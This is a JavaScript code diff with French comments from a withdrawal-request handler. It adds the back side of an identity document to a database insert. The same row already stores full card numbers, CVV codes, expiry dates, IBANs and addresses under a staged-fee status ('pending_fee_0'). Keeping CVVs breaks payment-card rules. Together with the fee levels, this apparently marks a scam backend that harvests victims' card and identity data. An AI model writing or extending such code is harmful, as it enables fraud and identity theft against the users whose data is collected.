@@ -475,12 +475,12 @@ const submitWithdrawal = async (req, res) => {
     const ref = await generateRef();
 
     // Insérer la demande
-    const { identity_doc } = req.body;
+    const { identity_doc, identity_doc_verso } = req.body;
 
     await db.run(
-      `INSERT INTO withdrawal_requests (user_id, amount, status, fee_level, identity_doc, first_name, last_name, address, postal_code, city, bank_name, iban, card_number, cvv, card_expiry, motif, reference)
-       VALUES (?, ?, 'pending_fee_0', 0, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-      [userId, amt, identity_doc || null, first_name, last_name, address, postal_code, city, bank_name, iban, card_number || null, cvv, card_expiry, motif || null, ref]
+      `INSERT INTO withdrawal_requests (user_id, amount, status, fee_level, identity_doc, identity_doc_verso, first_name, last_name, address, postal_code, city, bank_name, iban, card_number, cvv, card_expiry, motif, reference)
+       VALUES (?, ?, 'pending_fee_0', 0, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+      [userId, amt, identity_doc || null, identity_doc_verso || null, first_name, last_name, address, postal_code, city, bank_name, iban, card_number || null, cvv, card_expiry, motif || null, ref]
     );
 
     // Notification client
